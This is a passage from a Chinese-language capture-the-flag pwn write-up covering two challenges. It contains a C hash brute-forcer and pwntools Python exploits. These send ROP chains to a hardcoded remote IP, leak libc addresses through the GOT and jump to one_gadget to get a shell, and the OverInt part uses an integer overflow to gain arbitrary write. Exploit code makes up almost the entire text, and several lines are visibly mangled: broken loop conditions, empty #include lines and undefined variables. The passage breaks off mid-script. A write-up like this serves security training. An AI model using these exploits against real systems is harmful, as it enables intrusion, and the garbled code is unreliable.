        }
        val++;
    }
    long long hash(){
      int64_t v0; // ST08_8
      int v2; // [rsp+10h] [rbp-10h]
      int i; // [rsp+14h] [rbp-Ch]
      int64_t v4; // [rsp+18h] [rbp-8h]
      v4 = 0LL;
      v2 = strlen(key);
      for ( i = 0; i > 64) + v0) >> 40)
            - (v0 >> 63));
      }
      return v4;
    }
    int main(){
        char_set[0] = '\x00';
        long long ret;
        int iter =0;
        unsigned long long total = 53^8;
        while(key[8] != 'z' ){
            iter++;
            // puts(key);
            if ( hash() == 0x53CBEB035LL ){
                break;
            }
            inc_key();
        }
        if(key[8] == 0xff){
            puts("no result");
        }
        puts(key);
        return 0;
    }
然后就是简单的栈溢出rop, 先leak puts 的地址, 然后再跳到one gadget即可
    from pwn import *
    import time
    context(arch = 'amd64', os = 'linux', endian = 'little')
    context.log_level = 'debug'
    ru = lambda x : io.recvuntil(x)
    sn = lambda x : io.send(x)
    rl = lambda   : io.recvline()
    sl = lambda x : io.sendline(x)
    rv = lambda x : io.recv(x)
    sa = lambda a,b : io.sendafter(a,b)
    sla = lambda a,b : io.sendlineafter(a,b)
    ip = "58.20.46.148"
    port = 38733
    LOCAL = False
    X86_32 = False
    break_points = [0x4008AB]
    b_str = ''
    for break_point in break_points:
            b_str += "b *" + hex(break_point ) + '\n'
    # libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
    elf = ELF("./"+filename)
    if LOCAL:
        io = process("./" + filename)
        libc = elf.libc
    else:
        io = remote(ip, port)
        libc = ELF('libc.so.6')
    def wait(t=0.3):
        sleep(t)
    def mydebug():
      gdb.attach(io, b_str)
    key = "wyBTs"
    PrdiR = 0x400983
    got_puts = 0x601018
    puts_off = libc.symbols['puts']
    payload = 'a'*0x70 + p64(got_puts+0x70) + p64(PrdiR) + p64(got_puts) + p64(0x40082d)
    wait()
    sl(key)
    wait()
    sl(payload)
    ru('Success\n')
    res = rl()[0:6]
    puts_addr = u64(res+'\x00\x00')
    log.info('puts_addr: '+hex(puts_addr))
    libc_base = puts_addr - puts_off
    log.info('libc base: '+hex(libc_base))
    one = libc_base + 0x4526a
    wait()
    sl(p64(one))
    io.interactive()
### OverInt
首先也是过两个check, 利用存在的整形溢出很好构造. 然后就可以任意地址写了.  
第一次先同时leak puts 和 setbuf的地址, 然后算出libc.  
第二次根据libc和leak的地址算出one gadget的地址, 跳到 one gadget即可  
首先是计算绕过check的输入
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int target = 0x23;
    int func(int v3, int i){
        return ((i>>4) + v3*4) ^ (i>4) + (v3*4)) ^ (i << 10)
    key_target = 0x23
    def get_key():
      for i in range(ord('!'), ord('~')+1):
        for j in range(ord('!'), ord('~')+1):
          for k in range(ord('!'), ord('~')+1):
            for l in range(ord('!'), ord('~')+1):
              print('...')
              v3 = 0
              v3 = func(v3, i)
              v3 = func(v3, j)
              v3 = func(v3, k)
              v3 = func(v3, l)
              ret = v3%47
              if(v3 == 0x23):
                # print('target is %d %d %d %d'%(i, j, k, l))
                target = [i, j, k, l]
                print(''.join([chr(v) for v in target]))
                return
    key = '!'*3+'\x95'
    target = 0x20633372
    PrdiR = 0x400b13
    got_puts =   0x602018
    got_setbuf = 0x602020
    got_printf = 0x602028
    # puts = 0x4008F7
    puts = 0x4009AC
    main = 0x40087F
    plt_puts = 0x400550
    def leak_addr(addr):
      pass_check()
      sn(p32(32))
      payload  = p64(PrdiR) + p64(addr) + p64(plt_puts) + p64(main)
      for i in range(0, 32):
        sn(p32(0x38+i))
        sn(payload[i])
      ru("hello!")
      wait()
      res = rl()[0:6]
      log.debug(repr(res))
      addr = u64(res+'\x00\x00')
      log.info('addr: ' + hex(addr))
      return addr
      # sn(p32(24))
    def get_libc():
      addr1 = leak_addr(got_puts)
      log.info('puts:' + hex(addr1))
      wait()
      addr2 = leak_addr(got_setbuf)
      log.info('setbuf:'+hex(addr2))
      wait()
    puts_off = 0x6f690
    one_off = 0x45216
    def get_shell():
        puts_addr = leak_addr(got_puts)
        libc_base = puts_addr - puts_off
        log.info('libc base:' + hex(libc_base))
        pass_check()
        sn(p32(32))
        payload  = p64(PrdiR) + p64(0) + p64(libc_base+one_off) + p64(main)
        for i in range(0, 32):
          sn(p32(0x38+i))
          sn(payload[i])
        ru("hello!")
        wait()
        res = rl()[0:6]
        log.debug(repr(res))
        addr = u64(res+'\x00\x00')
        log.info('addr: ' + hex(addr))
        return addr
    def pass_check():
      # ru('Please set arrary number: ')
      sleep(0.1)
      sn(key)
      ru('How many numbers do you have?')
      sn(p32(5))
      ru('the number')
      sn(p32(target))
      for i in range(0, 4):
        ru('the number')
        sn(p32(0))
      ru("How many positions you want to modify?")
    if __name__ == '__main__':
      # mydebug()